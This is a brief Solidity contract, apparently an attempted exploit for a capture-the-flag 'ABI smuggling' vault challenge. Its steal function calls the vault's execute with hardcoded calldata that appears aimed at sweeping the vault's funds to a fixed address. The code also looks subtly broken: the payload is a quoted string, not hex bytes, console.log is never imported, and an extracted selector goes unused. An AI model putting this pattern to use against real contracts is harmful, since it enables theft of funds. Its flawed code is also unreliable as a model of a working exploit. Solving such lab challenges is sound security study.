// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./AuthorizedExecutor.sol";
import "./SelfAuthorizedVault.sol";

contract StealFromAbiSmuggling {
    address public vault;

    constructor(address _vault) {
        vault = _vault;
    }

    function steal(address target, bytes calldata actionData) public {
        console.log("------steal");
        console.logBytes(msg.data);
        console.logBytes(actionData);
        console.log("------steal end");
        bytes4 selector;
        assembly {
            selector := calldataload(0)
        }
        SelfAuthorizedVault(vault).execute(
            target,
            "0x85fb709d0000000000000000000000003c44cdddb6a900fa2b585dd299e03d12fa4293bc0000000000000000000000005fbdb2315678afecb367f032d93f642f64180aa3"
        );
    }
}
